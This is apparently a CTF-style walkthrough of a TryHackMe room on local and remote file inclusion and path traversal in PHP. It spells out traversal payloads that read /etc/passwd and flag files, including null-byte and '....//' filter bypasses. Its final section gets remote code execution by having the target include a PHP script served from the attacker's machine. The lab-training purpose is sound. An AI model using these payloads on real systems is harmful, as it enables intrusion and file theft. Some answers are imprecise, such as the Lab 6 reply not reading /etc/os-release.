```
  ______ _ _        _____            _           _             
 |  ____(_) |      |_   _|          | |         (_)            
 | |__   _| | ___    | |  _ __   ___| |_   _ ___ _  ___  _ __  
 |  __| | | |/ _ \   | | | '_ \ / __| | | | / __| |/ _ \| '_ \ 
 | |    | | |  __/  _| |_| | | | (__| | |_| \__ \ | (_) | | | |
 |_|    |_|_|\___| |_____|_| |_|\___|_|\__,_|___/_|\___/|_| |_|
```
This room introduces file inclusion vulnerabilities, including *Local File Inclusion*
(LFI), *Remote File Inclusion* (RFI), and directory traversal. [^1]

Path Traversal
-----------------------------------------------------------------------------------------
**What function causes path traversal vulnerabilities in PHP?**

Path or dictionary traversal allows an attacker to read undisclosed operating system
resources by manipulating the web application's URL to locate and access files or
directories stored outside the application's root directory. A path traversal
vulnerability may occur when the user's input is passed to a function such as
`file_get_contents` in PHP or there is poor input validation or filtering.

Local File Inclusion - LFI
-----------------------------------------------------------------------------------------
**Give Lab 1 a try to read `/etc/passwd`. What would the request URI be?**

In Lab 1 we are able to enter any file we want to read to to a local file intrusion
vulnerability. So, we enter `/etc/passwd` and are thus able to read the contents of the
file with the URI `/lab1.php?file=%2Fetc%2Fpasswd` which can be translated to
`/lab1.php?file=/etc/passwd`.

**In Lab 2, what is the directory specified in the include function?**

In Lab 2 we can once again try to print the contents of `/etc/passwd` but get a warning
this time, that there exists no file `includes//etc/passwd`, so `includes/` is the
specified directory here.

Local File Inclusion - LFI Continued
-----------------------------------------------------------------------------------------
**Give Lab 3 a try to read `/etc/passwd`. What does the request look like?**

If we naively try to read the contents of `/etc/passwd` we don't succeed because the
filename is appended with the extension `.php`. Instead we try to read the contents of
`../../../../etc/passwd%00` but this too doesn't succeed as expected. We know for sure,
that the current path is `var/www/html/includes` and that the file ending `.php` is
appended to our input string. But instead of entering this in the input bar, the URL
should be: `/lab3.php?file=../../../../etc/passwd%00`
```text
http://<MACHINE_IP_ADDRESS>/lab3.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
```

**Which function is causing the directory traversal in Lab 4?**

In Lab 4, the function `file_get_contents` is causing the directory traversal
vulnerability and we can append `lab4.php?file=%2Fetc%2Fpasswd%00` to the URL.

**Try out Lab 5 and check what directory has to be in the input field.**

For Lab 5 it can be found out that the web application replaces all occurrences of
`../` with an empty string. If we were to provide `....//` however, the PHP code
replaces only the first substring and doesn't do another pass. So, typing
`....//....//....//....//....//....//etc/passwd` into the input field returns the
contents of the /etc/passwd file. 

**Try out Lab 6 and read `/etc/os-release`. What is the `VERSION_ID` value?**

Figuring Lab 6's local file intrusion vulnerability isn't too hard either:
`THM-profile/../../../../etc/passwd`

Challenge
-----------------------------------------------------------------------------------------
**Capture the flags at `/etc/flag1`, `/etc/flag2` and `/etc/flag3`.**

First we need to visit the site `http://<MACHINE_IP_ADDRESS>/challenges/index.php` and
then we get hinted that the input form is broken. We need to send a *POST* request with
the `file` parameter manually in the developer tools instead. So, we craft such a HTTP
POST request with the payload `file=/etc/flag1`. But the file doesn't get printed
because we are in the directory `var/www/html`. Instead we provide the payload
`file=../../../etc/flag1` but this too isn't accepted. Finally, we suspect the file
ending and use `file=../../../etc/flag1%00` which prints the flag contents. \
In the second challenge, we first need to change the cookie value to *Admin* and then
see a warning that tells us that the `include()` function is utilized. But, we can also
enter the path to the flag `../../../../etc/flag2%00` as the cookie value and get
printed the flag contents.
In the third challenge, the predetermined file ending is `.php` and the `/` are removed
from the `include()` function. However, if we resend the HTTP request as a *POST* and
not *GET* form and set the payload to `file=../../../etc/flag%00` we can get the flag
due to missing *POST* input sanitization.

**Gain RCE in Lab Playground `/playground.php` with RFI to execute the hostname command.
What is the output?**

In order to gain remote file intrusion based RCE, we need to set up a serve with
`python3 -m http.server` and create a script in the same directory with the contents
`<?php print exec('hostname'); ?>` and filename `print_hostname.txt`. Then, we can enter
`http://<ATTACK_MACHINE_IP>:8000/print_hostname.txt` in the playground lab and the file
contents will get executed on the victim server.

[^1]: https://tryhackme.com/room/fileinc
